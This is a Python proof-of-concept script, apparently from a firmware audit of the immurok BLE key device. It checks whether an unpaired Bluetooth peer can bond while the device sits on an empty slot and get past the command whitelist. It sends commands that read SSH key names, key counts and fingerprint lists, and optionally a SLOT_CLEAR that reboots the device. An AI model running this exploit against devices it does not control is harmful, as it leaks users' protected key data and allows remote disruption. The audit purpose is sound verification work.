#!/usr/bin/env python3
"""复现：空槽驻留期，未配对的 BLE 对端能否 bond 并绕过未配对命令白名单。

审计假设（静态分析得出，本脚本验证）：

  apply_ble_pairing_mode() 按**活动槽**决定 bond 模式：空槽 → WAIT_FOR_REQ，
  接受新 bond。而未配对命令白名单（hidkbd.c:4899）用的是 is_paired()（**任
  一**槽）——设备只要有一个槽有货，白名单整个跳过。于是设备停在空槽时，一个
  从没配对过的对端 bond 上来后，能发本应被白名单挡住的命令，其中：
    - KEY_READ  读出 SSH 公钥名 / OTP 名 / API 名（本不该对未配对方可见）
    - SLOT_CLEAR（空 payload）无指纹门，执行后设备重启

  这台 Mac 就扮演那个「陌生对端」——它对设备的槽 1 从未配对过。

前置：
  1. 设备已和**另一台**主机在槽 1 配对（本机不是那台）。
  2. 在那台主机上按切换指纹，把设备切到**空的槽 2**（白灯闪）。
  3. 本机蓝牙里**不要**先手动配对；脚本自己触发 bond。
  4. pip3 install bleak

跑法：
  python3 ota/repro_slot_bond_bypass.py            # 只读，安全
  python3 ota/repro_slot_bond_bypass.py --try-clear # 额外发一次 SLOT_CLEAR（会让设备重启！）

判读：
  - 「bond 成功 + KEY_READ 回了数据」→ 高危假设成立
  - 「命令被拒 (0xF2 NOT_PAIRED)」→ 白名单挡住了，假设不成立
  - 「写特征时报加密/鉴权错误」→ 没 bond 上，需要先在系统蓝牙里配一次再看
"""
import argparse
import asyncio
import sys

# 与 app-linux-rs/crates/immurok-common/src/protocol.rs 一致
SERVICE_UUID = "45529919-7668-48f9-b9fe-e4eabe6595d9"
CMD_CHAR_UUID = "8a537e1f-3992-4b2c-8b77-8d4e778186e1"
RSP_CHAR_UUID = "76a1660d-8cf6-44d1-b3fc-70486028e289"

CMD_GET_STATUS = 0x01
CMD_SLOT_STATUS = 0x39
CMD_KEY_COUNT = 0x60
CMD_KEY_READ = 0x61
CMD_FP_LIST = 0x13
CMD_SLOT_CLEAR = 0x3C

RSP_ERR_NOT_PAIRED = 0xF2

KEY_CAT_SSH = 0


def frame(cmd, payload=b""):
    # 包格式：[cmd][len][payload...]（与固件 pData[0]=cmd, pData[1]=len 一致）
    return bytes([cmd, len(payload)]) + payload


def rejected(r):
    # 固件拒绝时回 [cmd echo][错误码]（hidkbd.c: rspBuf[0]=cmd, rspBuf[1]=err）。
    # NOT_PAIRED 在**第二字节**，不是第一字节——第一字节永远是 cmd 回显。
    return r is not None and len(r) == 2 and r[1] == RSP_ERR_NOT_PAIRED


async def main(try_clear: bool):
    from bleak import BleakScanner, BleakClient

    print("扫描 immurok 设备（10s）…")
    dev = await BleakScanner.find_device_by_filter(
        lambda d, ad: (d.name or "").lower().startswith("immurok"), timeout=10.0
    )
    if dev is None:
        print("没找到。确认设备在广播（白灯 = 空的槽 2），且本机蓝牙开着。")
        return 2

    print(f"找到 {dev.name} @ {dev.address}")
    print("连接（若从未配对，这一步会触发 Just Works bond）…")

    responses = []

    async with BleakClient(dev) as client:
        print(f"已连接。services 解析中…")

        def on_notify(_char, data: bytearray):
            responses.append(bytes(data))

        await client.start_notify(RSP_CHAR_UUID, on_notify)

        async def send(cmd, payload=b"", label=""):
            responses.clear()
            try:
                # write-with-response：加密不足 / 未 bond 会在这里抛异常
                await client.write_gatt_char(CMD_CHAR_UUID, frame(cmd, payload), response=True)
            except Exception as e:
                print(f"  [{label}] 写失败：{e!r}")
                print("    → 多半是没 bond 上（加密/鉴权不足）。这本身不算漏洞。")
                return None
            await asyncio.sleep(1.0)
            if not responses:
                print(f"  [{label}] 无响应")
                return None
            r = responses[-1]
            print(f"  [{label}] 响应 = {r.hex()}")
            return r

        # 1) 白名单内命令，确认链路能用
        r = await send(CMD_GET_STATUS, label="GET_STATUS")
        if r is None:
            print("\n结论：连不上或没 bond。请先在系统蓝牙里手动配一次，再重跑。")
            return 1

        r = await send(CMD_SLOT_STATUS, label="SLOT_STATUS")
        if r and len(r) >= 4:
            print(f"    bitmap=0x{r[2]:02x} active_slot={r[3]}  "
                  f"（active 应为 2，且 bit1=0 表示槽 2 空）")

        # 2) 白名单外命令：这些若返回数据，就是漏洞
        print("\n--- 未配对方本不该能读到的东西 ---")
        leaked = False

        r = await send(CMD_KEY_COUNT, bytes([KEY_CAT_SSH]), label="KEY_COUNT ssh")
        if r and not rejected(r):
            print("    → 泄露：拿到了 SSH 密钥数量")
            leaked = True

        r = await send(CMD_FP_LIST, label="FP_LIST")
        if r and not rejected(r):
            print("    → 泄露：拿到了指纹列表")
            leaked = True

        # KEY_READ ssh idx0 off0：name[16]+pubkey 的头部
        r = await send(CMD_KEY_READ, bytes([KEY_CAT_SSH, 0, 0]), label="KEY_READ ssh#0")
        if r and not rejected(r):
            print("    → 泄露：读到了 SSH 条目内容（名字/公钥）")
            leaked = True

        print()
        if leaked:
            print("!! 高危假设成立：未配对对端在空槽驻留期读到了受保护数据。")
            print("   修法：未配对命令白名单改用 active_slot_paired()（见审计）。")
        else:
            print("== 未观察到泄露：命令都被 NOT_PAIRED 挡住，或链路要求已 bond。")
            print("   若上面 GET_STATUS 成功但这些都被拒，说明白名单已按活动槽收紧。")

        # 3) 可选：SLOT_CLEAR 无指纹门 → 远程重启
        if try_clear:
            print("\n--- SLOT_CLEAR（会让设备重启！）---")
            r = await send(CMD_SLOT_CLEAR, label="SLOT_CLEAR own")
            if r and not rejected(r):
                print("    → 未配对对端触发了 SLOT_CLEAR。设备应正在重启。")
                print("      若这是槽 1（走 save_security_data），则是对 SSH 私钥所在 block 0 的写。")
            else:
                print("    被拒（NOT_PAIRED）——白名单挡住了。")

    return 0


if __name__ == "__main__":
    ap = argparse.ArgumentParser()
    ap.add_argument("--try-clear", action="store_true",
                    help="额外发一次 SLOT_CLEAR，会让设备重启")
    args = ap.parse_args()
    try:
        sys.exit(asyncio.run(main(args.try_clear)))
    except KeyboardInterrupt:
        sys.exit(130)
